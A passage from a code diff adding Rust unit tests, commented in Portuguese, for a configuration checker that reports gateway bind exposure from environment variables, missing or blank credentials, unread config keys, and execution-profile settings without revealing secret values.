+    fn achado_de_chave_morta<'a>(findings: &'a [Finding], campo: &str) -> Option<&'a Finding> {
+        findings
+            .iter()
+            .find(|f| f.field == campo && f.message.contains("is deprecated and not read by"))
+    }
+
+    /// O achado de hostname que o check nao consegue julgar.
+    fn achado_de_hostname(findings: &[Finding]) -> Option<&Finding> {
+        findings
+            .iter()
+            .find(|f| f.field == "gateway.host" && f.message.contains("cannot tell"))
+    }
+
+    /// O guard devolve o ambiente mesmo quando o corpo entra em panic —
+    /// senao um teste quebrado vazaria `HOST=0.0.0.0` para os vizinhos.
+    #[test]
+    fn restaura_bind_env_devolve_o_ambiente_mesmo_com_panic() {
+        let _guard = crate::ENV_TEST_LOCK
+            .lock()
+            .unwrap_or_else(|e| e.into_inner());
+        let _ambiente = RestauraBindEnv::capturar();
+        // SAFETY: ENV_TEST_LOCK held.
+        unsafe {
+            std::env::set_var("HOST", "antes");
+            std::env::set_var("PORT", "1111");
+        }
+        let resultado = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
+            let _restaura = RestauraBindEnv::capturar();
+            // SAFETY: ENV_TEST_LOCK held.
+            unsafe {
+                std::env::set_var("HOST", "0.0.0.0");
+                std::env::remove_var("PORT");
+            }
+            panic!("corpo do teste quebrou");
+        }));
+        assert!(resultado.is_err(), "o panic tem de propagar");
+        assert_eq!(
+            std::env::var_os("HOST").as_deref(),
+            Some(std::ffi::OsStr::new("antes")),
+            "HOST tem de voltar ao valor de antes do panic"
+        );
+        assert_eq!(
+            std::env::var_os("PORT").as_deref(),
+            Some(std::ffi::OsStr::new("1111")),
+            "PORT removida dentro do corpo tem de ser reposta"
+        );
+    }
+
+    /// Um arquivo em `0.0.0.0` sem env NAO expoe nada: o start nem le a
+    /// chave. O que o check diz e exatamente isso — chave morta — e nunca
+    /// mais "binds all interfaces" sobre um valor que nao sobe.
+    #[test]
+    fn arquivo_em_todas_as_interfaces_sem_env_e_chave_morta_nao_exposicao() {
+        let mut cfg = AppConfig::default();
+        cfg.gateway.host = "0.0.0.0".into();
+        let findings = validate_com_bind(&cfg, None, None);
+        assert!(
+            achado_de_exposicao(&findings).is_none(),
+            "sem HOST, o bind e o default do clap (loopback): {findings:?}"
+        );
+        let hit = achado_de_chave_morta(&findings, "gateway.host").unwrap_or_else(|| {
+            panic!("o 0.0.0.0 do arquivo tem de ser reportado como nao lido: {findings:?}")
+        });
+        assert!(matches!(hit.severity, Severity::Warning));
+        assert!(
+            hit.message.contains("gateway.host=`0.0.0.0`")
+                && hit.message.contains("127.0.0.1:3888"),
+            "o achado nomeia a chave morta e o que sobe de fato: {hit:?}"
+        );
+        assert!(
+            !hit.message.contains("binds all interfaces") && !hit.message.contains("(config file)"),
+            "nada de fingir exposicao sobre um valor morto: {hit:?}"
+        );
+    }
+
+    /// Idem para as grafias IPv6 do "toda interface" no arquivo.
+    #[test]
+    fn arquivo_em_ipv6_todas_as_interfaces_sem_env_e_chave_morta() {
         for host in ["::", "[::]"] {
             let mut cfg = AppConfig::default();
             cfg.gateway.host = host.into();
-            let findings = validate(&cfg);
+            let findings = validate_com_bind(&cfg, None, None);
             assert!(
-                findings.iter().any(|f| f.field == "gateway.host"),
-                "{host} bind must fire the exposure warning: {findings:?}"
+                achado_de_exposicao(&findings).is_none(),
+                "{host} no arquivo nao sobe, logo nao expoe: {findings:?}"
+            );
+            assert!(
+                achado_de_chave_morta(&findings, "gateway.host").is_some(),
+                "{host} no arquivo tem de virar achado de chave morta: {findings:?}"
             );
         }
     }
 
     #[test]
     fn bind_loopback_does_not_warn_about_exposure() {
-        // AppConfig::default() binds 127.0.0.1.
-        let findings = validate(&AppConfig::default());
+        // AppConfig::default() binds 127.0.0.1:3888 — igual ao default do
+        // clap, entao nem chave morta ha para reportar.
+        let findings = validate_com_bind(&AppConfig::default(), None, None);
         assert!(
-            !findings.iter().any(|f| f.field == "gateway.host"),
-            "loopback bind must not fire the exposure warning: {findings:?}"
+            !findings
+                .iter()
+                .any(|f| f.field == "gateway.host" || f.field == "gateway.port"),
+            "loopback bind must not fire any bind finding: {findings:?}"
         );
     }
 
+    /// api_key + TLS cobrem o bind aberto — e com o arquivo igual a env,
+    /// nem chave morta ha.
     #[test]
     fn bind_all_interfaces_with_api_key_and_tls_does_not_warn() {
         let mut cfg = AppConfig::default();
@@ -2916,12 +5145,504 @@ mod tests {
         cfg.gateway.api_key = Some("test-gateway-bearer".into());
         cfg.gateway.tls_cert_path = Some("/etc/garraia/tls/cert.pem".into());
         cfg.gateway.tls_key_path = Some("/etc/garraia/tls/key.pem".into());
-        let findings = validate(&cfg);
+        let findings = validate_com_bind(&cfg, Some("0.0.0.0"), None);
         assert!(
             !findings.iter().any(|f| f.field == "gateway.host"),
-            "api_key + TLS on 0.0.0.0 must not warn: {findings:?}"
+            "api_key + TLS on HOST=0.0.0.0 must not warn: {findings:?}"
         );
     }
+
+    // ── #1261: o bind que vale e o efetivo — env, senao default do clap ───
+
+    /// A funcao pura: sem env, manda o default do clap — nunca o arquivo,
+    /// que nem entra na assinatura.
+    #[test]
+    fn bind_efetivo_sem_env_usa_o_default_do_clap() {
+        let bind = bind_efetivo(None, None);
+        assert_eq!(bind.host, HOST_DEFAULT);
+        assert_eq!(bind.port, PORT_DEFAULT);
+        assert_eq!(bind.host_source, FonteDoBind::DefaultDoClap);
+        assert_eq!(bind.port_source, FonteDoBind::DefaultDoClap);
+    }
+
+    /// Com env, manda a env — e cada metade tem origem propria.
+    #[test]
+    fn bind_efetivo_com_env_vence_o_default() {
+        let bind = bind_efetivo(Some("0.0.0.0"), None);
+        assert_eq!(bind.host, "0.0.0.0");
+        assert_eq!(bind.host_source, FonteDoBind::Env);
+        assert_eq!(bind.port, PORT_DEFAULT, "sem PORT, a porta e a do clap");
+        assert_eq!(bind.port_source, FonteDoBind::DefaultDoClap);
+
+        let bind = bind_efetivo(None, Some("4000"));
+        assert_eq!(bind.port, 4000);
+        assert_eq!(bind.port_source, FonteDoBind::Env);
+        assert_eq!(bind.host, HOST_DEFAULT);
+        assert_eq!(bind.host_source, FonteDoBind::DefaultDoClap);
+    }
+
+    /// `PORT` que o clap recusaria nao vira bind nenhum — cai no default.
+    #[test]
+    fn bind_efetivo_ignora_porta_invalida() {
+        for invalida in ["", "nao-e-numero", "70000", "-1"] {
+            let bind = bind_efetivo(None, Some(invalida));
+            assert_eq!(bind.port, PORT_DEFAULT, "PORT={invalida:?}");
+            assert_eq!(
+                bind.port_source,
+                FonteDoBind::DefaultDoClap,
+                "PORT={invalida:?}"
+            );
+        }
+    }
+
+    /// As constantes espelhadas nao podem divergir do `default_value` que
+    /// o clap aplica em `Commands::Start` — este teste le o fonte da CLI.
+    /// E prende tambem a ressalva sobre `garra restart`: se ele passar a
+    /// ler `HOST`/`PORT`, o texto do achado e docs/auth-config.md 5.1
+    /// precisam mudar junto.
+    #[test]
+    fn defaults_do_clap_espelham_o_main_da_cli() {
+        let fonte = include_str!("../../garraia-cli/src/main.rs");
+        let variante = |nome: &str| -> &str {
+            let inicio = fonte
+                .find(nome)
+                .unwrap_or_else(|| panic!("`{nome}` precisa existir em main.rs"));
+            let fim = fonte[inicio..]
+                .find("\n    },")
+                .map_or(fonte.len(), |n| inicio + n);
+            &fonte[inicio..fim]
+        };
+
+        let start = variante("Start {");
+        let host = format!("env = \"{HOST_ENV}\", default_value = \"{HOST_DEFAULT}\"");
+        let port = format!("env = \"{PORT_ENV}\", default_value = \"{PORT_DEFAULT}\"");
+        assert!(
+            start.contains(&host),
+            "`Commands::Start` precisa declarar `{host}` — se o default mudou, \
+             atualize HOST_DEFAULT em check.rs"
+        );
+        assert!(
+            start.contains(&port),
+            "`Commands::Start` precisa declarar `{port}` — se o default mudou, \
+             atualize PORT_DEFAULT em check.rs"
+        );
+        assert!(
+            fonte.contains("default_value = \"127.0.0.1\"")
+                && fonte.contains("default_value = \"3888\""),
+            "os literais do clap sumiram do main.rs"
+        );
+
+        // #1261: `restart` le HOST/PORT como o `start` (paridade) — sem isto
+        // um `restart` num pod RunPod religava em loopback em silencio.
+        let restart = variante("Restart {");
+        assert!(
+            restart.contains(&host) && restart.contains(&port),
+            "`Commands::Restart` precisa declarar `{host}` e `{port}`, como o Start"
+        );
+    }
+
+    /// O caso que o #1261 relata: arquivo seguro, `HOST=0.0.0.0`, e o
+    /// `config check` passando calado enquanto o gateway sobe aberto.
+    ///
+    /// Este e o teste de regressao: quem voltar a ler so
+    /// `config.gateway.host` derruba ele.
+    #[test]
+    fn host_env_expoe_o_bind_mesmo_com_arquivo_em_loopback() {
+        let cfg = AppConfig::default();
+        assert_eq!(cfg.gateway.host, "127.0.0.1", "premissa do teste");
+        let findings = validate_com_bind(&cfg, Some("0.0.0.0"), None);
+        let hit = achado_de_exposicao(&findings)
+            .unwrap_or_else(|| panic!("HOST=0.0.0.0 abre o gateway e tem de avisar: {findings:?}"));
+        // #1261 decisao A: o start recusa isto, entao o check diz Error.
+        assert!(matches!(hit.severity, Severity::Error), "{hit:?}");
+        assert!(hit.message.contains("will REFUSE"), "{hit:?}");
+        assert!(
+            hit.message.contains("HOST=`0.0.0.0`"),
+            "o achado tem de nomear a env como origem: {hit:?}"
+        );
+        assert!(
+            hit.message.contains("clap default `127.0.0.1`"),
+            "e dizer que a env cobriu o default do clap, nao o arquivo: {hit:?}"
+        );
+        assert!(
+            !hit.message.contains("from the config file"),
+            "o start nunca le o arquivo; o achado nao pode dizer o contrario: {hit:?}"
+        );
+        assert!(
+            achado_de_chave_morta(&findings, "gateway.host").is_some(),
+            "o 127.0.0.1 do arquivo que a env cobriu e chave morta: {findings:?}"
+        );
+    }
+
+    /// E a volta: um arquivo em `0.0.0.0` que a env cobre com loopback nao
+    /// e reportado como exposto, porque nao e isso que sobe — mas a chave
+    /// morta e dita.
+    #[test]
+    fn host_env_em_loopback_cala_o_aviso_do_arquivo() {
+        let mut cfg = AppConfig::default();
+        cfg.gateway.host = "0.0.0.0".into();
+        let findings = validate_com_bind(&cfg, Some("127.0.0.1"), None);
+        assert!(
+            achado_de_exposicao(&findings).is_none(),
+            "HOST=127.0.0.1 e o bind real; o 0.0.0.0 do arquivo nunca chega la: {findings:?}"
+        );
+        assert!(
+            achado_de_chave_morta(&findings, "gateway.host").is_some(),
+            "e o arquivo e reportado como nao lido: {findings:?}"
+        );
+    }
+
+    /// `HOST=""` (ou so espaco) nao e uma escolha de bind — vale o default
+    /// do clap, e o arquivo continua sendo so chave morta.
+    #[test]
+    fn host_env_em_branco_nao_conta_como_escolha() {
+        let mut cfg = AppConfig::default();
+        cfg.gateway.host = "0.0.0.0".into();
+        for branco in ["", "   "] {
+            let findings = validate_com_bind(&cfg, Some(branco), None);
+            assert!(
+                achado_de_exposicao(&findings).is_none(),
+                "HOST={branco:?} nao vira origem de bind: {findings:?}"
+            );
+            assert!(
+                achado_de_chave_morta(&findings, "gateway.host").is_some(),
+                "HOST={branco:?}: o 0.0.0.0 do arquivo segue morto: {findings:?}"
+            );
+        }
+    }
+
+    /// A porta do achado tambem e a efetiva, e o texto nao pode fingir
+    /// autoridade sobre a flag de `garra start` (outro processo) nem
+    /// esconder que `garra restart` ignora as envs.
+    #[test]
+    fn achado_de_bind_usa_a_porta_efetiva_e_admite_a_flag() {
+        let cfg = AppConfig::default();
+        let findings = validate_com_bind(&cfg, Some("0.0.0.0"), Some("4000"));
+        let hit = achado_de_exposicao(&findings).unwrap_or_else(|| panic!("{findings:?}"));
+        assert!(
+            hit.message.contains("port 4000 (from PORT)"),
+            "PORT=4000 e a porta que sobe, e o achado diz de onde veio: {hit:?}"
+        );
+        assert!(
+            hit.message.contains("--host"),
+            "o achado tem de admitir que a flag ainda vence: {hit:?}"
+        );
+        assert!(
+            hit.message.contains("restart"),
+            "a flag vale para start e restart: {hit:?}"
+        );
+        assert!(
+            achado_de_chave_morta(&findings, "gateway.port").is_some(),
+            "o 3888 do arquivo, coberto por PORT=4000, e chave morta: {findings:?}"
+        );
+    }
+
+    /// Chave morta e por metade: host e porta do arquivo sao reportados
+    /// separadamente, e so quando diferem do que sobe.
+    #[test]
+    fn chave_morta_do_arquivo_e_reportada_por_metade() {
+        let mut cfg = AppConfig::default();
+        cfg.gateway.host = "0.0.0.0".into();
+        cfg.gateway.port = 3977;
+
+        let findings = validate_com_bind(&cfg, None, None);
+        let host = achado_de_chave_morta(&findings, "gateway.host")
+            .unwrap_or_else(|| panic!("host morto: {findings:?}"));
+        assert!(matches!(host.severity, Severity::Warning));
+        let port = achado_de_chave_morta(&findings, "gateway.port")
+            .unwrap_or_else(|| panic!("porta morta: {findings:?}"));
+        assert!(matches!(port.severity, Severity::Warning));
+        assert!(
+            port.message.contains("gateway.port=`3977`")
+                && port.message.contains("resolved port 3888"),
+            "a porta morta nomeia o valor do arquivo e o que sobe: {port:?}"
+        );
+
+        // Env igual ao arquivo: o que sobe coincide, nada a reportar.
+        let findings = validate_com_bind(&cfg, Some("0.0.0.0"), Some("3977"));
+        assert!(
+            achado_de_chave_morta(&findings, "gateway.host").is_none()
+                && achado_de_chave_morta(&findings, "gateway.port").is_none(),
+            "arquivo igual a env nao e chave morta: {findings:?}"
+        );
+    }
+
+    /// `port: 0` ja e Error; nao ganha um segundo achado como chave morta.
+    #[test]
+    fn porta_zero_no_arquivo_nao_duplica_como_chave_morta() {
+        let mut cfg = AppConfig::default();
+        cfg.gateway.port = 0;
+        let findings = validate_com_bind(&cfg, None, None);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.field == "gateway.port" && matches!(f.severity, Severity::Error)),
+            "port 0 continua Error: {findings:?}"
+        );
+        assert!(
+            achado_de_chave_morta(&findings, "gateway.port").is_none(),
+            "e nao vira eco como chave morta: {findings:?}"
+        );
+    }
+
+    /// O classificador segue o criterio do gateway (`is_loopback()`), com
+    /// as grafias que o `SocketAddr` aceita e o nome `localhost`.
+    #[test]
+    fn exposicao_do_host_classifica_como_o_gateway() {
+        use ExposicaoDoHost::*;
+        let casos = [
+            ("127.0.0.1", Loopback),
+            ("127.0.0.2", Loopback),
+            ("::1", Loopback),
+            ("[::1]", Loopback),
+            ("localhost", Loopback),
+            ("LOCALHOST", Loopback),
+            ("  127.0.0.1  ", Loopback),
+            ("0.0.0.0", TodasAsInterfaces),
+            ("::", TodasAsInterfaces),
+            ("[::]", TodasAsInterfaces),
+            ("::0", TodasAsInterfaces),
+            ("0:0:0:0:0:0:0:0", TodasAsInterfaces),
+            ("192.168.1.5", NaoLoopback),
+            ("10.0.0.7", NaoLoopback),
+            ("2001:db8::1", NaoLoopback),
+            ("gateway.internal", Indeterminada),
+            ("meu-host", Indeterminada),
+        ];
+        for (host, esperado) in casos {
+            assert_eq!(exposicao_do_host(host), esperado, "host={host:?}");
+        }
+    }
+
+    /// Toda grafia de "toda interface" e todo IP fora do loopback avisam
+    /// pela env; loopback e `localhost` calam; hostname vira achado
+    /// proprio, porque o check nao consegue julgar.
+    #[test]
+    fn host_env_nao_loopback_avisa_e_hostname_e_indeterminado() {
+        let cfg = AppConfig::default();
+        for host in ["::", "[::]", "::0", "0:0:0:0:0:0:0:0", "0.0.0.0"] {
+            let findings = validate_com_bind(&cfg, Some(host), None);
+            let hit = achado_de_exposicao(&findings)
+                .unwrap_or_else(|| panic!("HOST={host}: {findings:?}"));
+            assert!(
+                hit.message.contains("listens on every interface"),
+                "HOST={host}: {hit:?}"
+            );
+        }
+        for host in ["192.168.1.5", "10.0.0.7", "2001:db8::1"] {
+            let findings = validate_com_bind(&cfg, Some(host), None);
+            let hit = achado_de_exposicao(&findings)
+                .unwrap_or_else(|| panic!("HOST={host}: {findings:?}"));
+            assert!(
+                hit.message.contains("not a loopback address"),
+                "HOST={host}: {hit:?}"
+            );
+        }
+        for host in ["127.0.0.1", "127.0.0.2", "::1", "[::1]", "localhost"] {
+            let findings = validate_com_bind(&cfg, Some(host), None);
+            assert!(
+                achado_de_exposicao(&findings).is_none() && achado_de_hostname(&findings).is_none(),
+                "HOST={host} e loopback e nao pode avisar: {findings:?}"
+            );
+        }
+        for host in ["gateway.internal", "meu-host"] {
+            let findings = validate_com_bind(&cfg, Some(host), None);
+            assert!(
+                achado_de_exposicao(&findings).is_none(),
+                "HOST={host}: o check nao sabe se e loopback, nao pode afirmar exposicao: {findings:?}"
+            );
+            let hit = achado_de_hostname(&findings).unwrap_or_else(|| {
+                panic!("HOST={host} tem de virar achado de indeterminado: {findings:?}")
+            });
+            assert!(matches!(hit.severity, Severity::Warning));
+            assert!(
+                hit.message.contains(&format!("HOST=`{host}`")),
+                "o achado nomeia o hostname: {hit:?}"
+            );
+        }
+    }
+
+    /// Com api_key + TLS, nem o hostname indeterminado precisa avisar.
+    #[test]
+    fn hostname_indeterminado_cala_com_api_key_e_tls() {
+        let mut cfg = AppConfig::default();
+        cfg.gateway.api_key = Some("test-gateway-bearer".into());
+        cfg.gateway.tls_cert_path = Some("/etc/garraia/tls/cert.pem".into());
+        cfg.gateway.tls_key_path = Some("/etc/garraia/tls/key.pem".into());
+        let findings = validate_com_bind(&cfg, Some("gateway.internal"), None);
+        assert!(
+            achado_de_hostname(&findings).is_none(),
+            "credencial + TLS cobrem qualquer bind: {findings:?}"
+        );
+    }
+
+    /// #1241: `config check` reportava pela PRESENCA do campo, entao um
+    /// `api_key: "  "` — que deixa o gate de `/api/*` e do `/ws` desligado —
+    /// passava calado. Falsa garantia exatamente para quem foi consultar o
+    /// diagnostico antes de expor a porta.
+    #[test]
+    fn credencial_em_branco_conta_como_ausente_no_check() {
+        for valor in [None, Some(String::new()), Some("   ".to_string())] {
+            let mut cfg = AppConfig::default();
+            cfg.gateway.host = "0.0.0.0".into();
+            cfg.gateway.api_key = valor.clone();
+            cfg.gateway.tls_cert_path = Some("/etc/garraia/tls/cert.pem".into());
+            cfg.gateway.tls_key_path = Some("/etc/garraia/tls/key.pem".into());
+            // Desde o #1261 o bind que expoe e o da env, nao o do arquivo.
+            let findings = validate_com_bind(&cfg, Some("0.0.0.0"), None);
+            let f = achado_de_exposicao(&findings)
+                .unwrap_or_else(|| panic!("com {valor:?} o gate esta desligado: {findings:?}"));
+            assert!(
+                f.message.contains("no gateway credential is set"),
+                "o finding tem que nomear a credencial ausente: {f:?}"
+            );
+            assert!(
+                matches!(f.severity, Severity::Error),
+                "TLS nao isenta: {f:?}"
+            );
+        }
+    }
+
+    // ─── #1261: credencial por env, opt-out e o Error que espelha o boot ──
+
+    #[test]
+    fn exposto_sem_credencial_e_error_mesmo_sem_strict() {
+        let findings = validate_com_bind(&AppConfig::default(), Some("0.0.0.0"), None);
+        let hit = achado_de_exposicao(&findings).unwrap_or_else(|| panic!("{findings:?}"));
+        assert!(matches!(hit.severity, Severity::Error), "{hit:?}");
+        for trecho in [
+            " init`",
+            "gateway.api_key",
+            "GARRAIA_GATEWAY_API_KEY",
+            "--host 127.0.0.1",
+            "allow_unauthenticated_network_bind",
+        ] {
+            assert!(hit.message.contains(trecho), "falta {trecho}: {hit:?}");
+        }
+    }
+
+    #[test]
+    fn credencial_de_env_tira_o_error_de_exposicao() {
+        let mut cfg = AppConfig::default();
+        cfg.gateway.api_key_env = crate::auth::gateway_api_key_de(Some("da-env".into()));
+        let findings = validate_com_bind(&cfg, Some("0.0.0.0"), None);
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.field == "gateway.host" && matches!(f.severity, Severity::Error)),
+            "com GARRAIA_GATEWAY_API_KEY o start sobe; o check nao pode dizer Error: {findings:?}"
+        );
+        // Sem TLS ainda vale o aviso de credencial em texto claro.
+        let hit = achado_de_exposicao(&findings).unwrap_or_else(|| panic!("{findings:?}"));
+        assert!(matches!(hit.severity, Severity::Warning));
+        assert!(hit.message.contains("TLS is disabled"), "{hit:?}");
+    }
+
+    #[test]
+    fn opt_out_vira_warning_e_e_sempre_reportado() {
+        let mut cfg = AppConfig::default();
+        cfg.gateway.allow_unauthenticated_network_bind = true;
+        let exposto = validate_com_bind(&cfg, Some("0.0.0.0"), None);
+        let hit = achado_de_exposicao(&exposto).unwrap_or_else(|| panic!("{exposto:?}"));
+        assert!(matches!(hit.severity, Severity::Warning), "{hit:?}");
+        assert!(
+            hit.message.contains("WITHOUT a gateway credential"),
+            "{hit:?}"
+        );
+
+        let local = validate_com_bind(&cfg, None, None);
+        let opt = local
+            .iter()
+            .find(|f| f.field == "gateway.allow_unauthenticated_network_bind")
+            .unwrap_or_else(|| panic!("o opt-out e dito mesmo em loopback: {local:?}"));
+        assert!(matches!(opt.severity, Severity::Warning));
+    }
+
+    #[test]
+    fn env_e_arquivo_com_credenciais_diferentes_avisam_sem_mostrar_valor() {
+        let mut cfg = AppConfig::default();
+        cfg.gateway.api_key = Some("valor-do-arquivo-1261".into());
+        cfg.gateway.api_key_env = crate::auth::gateway_api_key_de(Some("valor-da-env-1261".into()));
+        let findings = validate_com_bind(&cfg, None, None);
+        let hit = findings
+            .iter()
+            .find(|f| f.field == "gateway.api_key")
+            .unwrap_or_else(|| panic!("{findings:?}"));
+        assert!(matches!(hit.severity, Severity::Warning));
+        let tudo = format!("{findings:?}");
+        assert!(!tudo.contains("valor-do-arquivo-1261") && !tudo.contains("valor-da-env-1261"));
+
+        // Iguais: nada a dizer.
+        cfg.gateway.api_key_env =
+            crate::auth::gateway_api_key_de(Some("valor-do-arquivo-1261".into()));
+        let findings = validate_com_bind(&cfg, None, None);
+        assert!(
+            !findings.iter().any(|f| f.field == "gateway.api_key"),
+            "{findings:?}"
+        );
+    }
+
+    /// `run_check` le `GARRAIA_GATEWAY_API_KEY` por conta propria (a config
+    /// do check vem sem env) e a reporta so por presenca.
+    #[test]
+    fn run_check_ve_a_credencial_de_env_so_por_presenca() {
+        let dir = std::env::temp_dir().join(format!(
+            "garraia-check-1261-{}-{}",
+            std::process::id(),
+            std::time::SystemTime::now()
+                .duration_since(std::time::UNIX_EPOCH)
+                .map(|d| d.as_nanos())
+                .unwrap_or(0)
+        ));
+        std::fs::create_dir_all(&dir).expect("dir");
+        let loader = ConfigLoader::with_dir(&dir);
+        let cfg = AppConfig::default();
+
+        let (check_com, check_sem) = com_bind_env(Some("0.0.0.0"), None, || {
+            struct Restaura(Option<std::ffi::OsString>);
+            impl Drop for Restaura {
+                fn drop(&mut self) {
+                    // SAFETY: ENV_TEST_LOCK held by com_bind_env.
+                    unsafe {
+                        match self.0.take() {
+                            Some(v) => std::env::set_var(GATEWAY_API_KEY_ENV, v),
+                            None => std::env::remove_var(GATEWAY_API_KEY_ENV),
+                        }
+                    }
+                }
+            }
+            let _r = Restaura(std::env::var_os(GATEWAY_API_KEY_ENV));
+            // SAFETY: ENV_TEST_LOCK held by com_bind_env.
+            unsafe { std::env::set_var(GATEWAY_API_KEY_ENV, "segredo-env-check-1261") };
+            let com = run_check(&loader, &cfg);
+            // SAFETY: idem.
+            unsafe { std::env::remove_var(GATEWAY_API_KEY_ENV) };
+            let sem = run_check(&loader, &cfg);
+            (com, sem)
+        });
+        let _ = std::fs::remove_dir_all(&dir);
+
+        assert!(check_com.summary.gateway_api_key_set);
+        assert!(
+            check_com
+                .source
+                .env_vars_detected
+                .iter()
+                .any(|v| v == GATEWAY_API_KEY_ENV)
+        );
+        assert!(
+            !check_com
+                .findings
+                .iter()
+                .any(|f| f.field == "gateway.host" && matches!(f.severity, Severity::Error))
+        );
+        let json = serde_json::to_string(&check_com).expect("json");
+        assert!(!json.contains("segredo-env-check-1261"), "{json}");
+
+        assert!(!check_sem.summary.gateway_api_key_set);
+        assert!(check_sem.has_errors(), "sem env o bind exposto e Error");
+    }
+
     // ─── #1050: as duas credenciais do canal Google Chat ──────────────────
 
     fn cfg_google_chat(enabled: Option<bool>, settings: serde_json::Value) -> AppConfig {
@@ -3692,5 +6413,396 @@ mod tests {
     fn teams_desabilitado_nao_avisa() {
         let msgs = mensagens_de_teams(&cfg_teams(Some(false), serde_json::json!({})));
         assert!(msgs.is_empty(), "canal desabilitado nao avisa: {msgs:?}");
+    }
+
+    // ── ADR 0024 / #1329: secao `execution` ───────────────────────────────
+
+    use crate::execution::{ExecutionConfig, ExecutionProfile, PROFILE_ENV, ProfileSource};
+    use crate::model::ChannelConfig;
+
+    fn execucao(profile: Option<ExecutionProfile>, pod_root: Option<&str>) -> ExecutionConfig {
+        ExecutionConfig::new(profile, pod_root.map(PathBuf::from))
+    }
+
+    fn canal_linked_com_owners(owners: serde_json::Value) -> HashMap<String, ChannelConfig> {
+        let mut settings = HashMap::new();
+        settings.insert("owners".to_string(), owners);
+        HashMap::from([(
+            "whatsapp_linked".to_string(),
+            ChannelConfig {
+                channel_type: "whatsapp_linked".to_string(),
+                enabled: Some(true),
+                settings,
+            },
+        )])
+    }
+
+    /// Env invalida e Error — o mesmo valor derruba `ConfigLoader::load`, e
+    /// o check tem de dizer isso antes do boot, nomeando a env.
+    #[test]
+    fn execution_env_invalida_e_error() {
+        let err = "pod".parse::<ExecutionProfile>().expect_err("invalido");
+        let achados = validate_execution(&execucao(None, None), &Err(err), &HashMap::new());
+        assert_eq!(achados.len(), 1, "{achados:?}");
+        assert_eq!(achados[0].severity, Severity::Error);
+        assert_eq!(achados[0].field, "execution.profile");
+        assert!(
+            achados[0].message.contains(PROFILE_ENV),
+            "{}",
+            achados[0].message
+        );
+        assert!(
+            achados[0].message.contains("\"pod\""),
+            "{}",
+            achados[0].message
+        );
+
+        // O gemeo: env valida ou ausente nao produz achado nenhum.
+        for env in [Ok(None), Ok(Some(ExecutionProfile::IsolatedPod))] {
+            let achados = validate_execution(&execucao(None, None), &env, &HashMap::new());
+            assert!(achados.is_empty(), "{achados:?}");
+        }
+    }
+
+    /// `pod_root` declarado com perfil `standard` e Warning: nao faz nada.
+    #[test]
+    fn execution_pod_root_em_standard_avisa() {
+        let achados = validate_execution(
+            &execucao(None, Some("/workspace")),
+            &Ok(None),
+            &HashMap::new(),
+        );
+        assert_eq!(achados.len(), 1, "{achados:?}");
+        assert_eq!(achados[0].severity, Severity::Warning);
+        assert_eq!(achados[0].field, "execution.pod_root");
+        assert!(
+            achados[0].message.contains("isolated-pod"),
+            "{}",
+            achados[0].message
+        );
+
+        // O gemeo: em isolated-pod (por arquivo ou por env) o mesmo pod_root
+        // absoluto e limpo.
+        let por_arquivo = validate_execution(
+            &execucao(Some(ExecutionProfile::IsolatedPod), Some("/workspace")),
+            &Ok(None),
+            &HashMap::new(),
+        );
+        assert!(por_arquivo.is_empty(), "{por_arquivo:?}");
+        let por_env = validate_execution(
+            &execucao(None, Some("/workspace")),
+            &Ok(Some(ExecutionProfile::IsolatedPod)),
+            &HashMap::new(),
+        );
+        assert!(por_env.is_empty(), "{por_env:?}");
+    }
+
+    /// A env vence o arquivo tambem no check: arquivo `isolated-pod` +
+    /// env `standard` => o pod_root avisa como em standard.
+    #[test]
+    fn execution_env_standard_vence_arquivo_isolated_pod() {
+        let achados = validate_execution(
+            &execucao(Some(ExecutionProfile::IsolatedPod), Some("/workspace")),
+            &Ok(Some(ExecutionProfile::Standard)),
+            &HashMap::new(),
+        );
+        assert_eq!(achados.len(), 1, "{achados:?}");
+        assert_eq!(achados[0].field, "execution.pod_root");
+        assert!(
+            achados[0].message.contains("`standard`"),
+            "{}",
+            achados[0].message
+        );
+    }
+
+    #[test]
+    fn execution_pod_root_relativo_avisa() {
+        let achados = validate_execution(
+            &execucao(Some(ExecutionProfile::IsolatedPod), Some("workspace")),
+            &Ok(None),
+            &HashMap::new(),
+        );
+        assert_eq!(achados.len(), 1, "{achados:?}");
+        assert_eq!(achados[0].severity, Severity::Warning);
+        assert_eq!(achados[0].field, "execution.pod_root");
+        assert!(
+            achados[0].message.contains("absolute"),
+            "{}",
+            achados[0].message
+        );
+    }
+
+    /// `owners` preenchido em `standard` e Warning; em `isolated-pod` nao.
+    /// A mensagem traz a contagem, nunca as identidades.
+    #[test]
+    fn execution_owners_em_standard_avisa_sem_ecoar_identidades() {
+        let canais = canal_linked_com_owners(serde_json::json!(["5511999998888", "abc@lid"]));
+        let achados = validate_execution(&execucao(None, None), &Ok(None), &canais);
+        assert_eq!(achados.len(), 1, "{achados:?}");
+        assert_eq!(achados[0].severity, Severity::Warning);
+        assert_eq!(achados[0].field, "channels.whatsapp_linked.owners");
+        assert!(
+            achados[0].message.contains("2 identities"),
+            "{}",
+            achados[0].message
+        );
+        assert!(
+            achados[0].message.contains("isolated-pod"),
+            "{}",
+            achados[0].message
+        );
+        assert!(
+            !achados[0].message.contains("5511999998888"),
+            "{}",
+            achados[0].message
+        );
+        assert!(
+            !achados[0].message.contains("abc@lid"),
+            "{}",
+            achados[0].message
+        );
+
+        // Gemeos: isolated-pod com os mesmos owners e limpo; owners vazio em
+        // standard tambem; outro tipo de canal com `owners` nao e deste check.
+        let limpo = validate_execution(
+            &execucao(Some(ExecutionProfile::IsolatedPod), None),
+            &Ok(None),
+            &canais,
+        );
+        assert!(limpo.is_empty(), "{limpo:?}");
+        let vazio = validate_execution(
+            &execucao(None, None),
+            &Ok(None),
+            &canal_linked_com_owners(serde_json::json!([])),
+        );
+        assert!(vazio.is_empty(), "{vazio:?}");
+        let mut outro = canal_linked_com_owners(serde_json::json!(["1"]));
+        if let Some(ch) = outro.get_mut("whatsapp_linked") {
+            ch.channel_type = "whatsapp".to_string();
+        }
+        let outro_tipo = validate_execution(&execucao(None, None), &Ok(None), &outro);
+        assert!(outro_tipo.is_empty(), "{outro_tipo:?}");
+    }
+
+    /// O caminho de producao com a env injetada: `validate_com_env` e
+    /// `summarise_com_env` recebem o que `run_check` leu UMA vez. Nenhum
+    /// valor invalido entra em `GARRAIA_EXECUTION_PROFILE` de verdade neste
+    /// binario (review C7): `validate` e `load` sao lidos sem lock por outros
+    /// testes, e um Error/Err em transito os derrubaria. A leitura real da
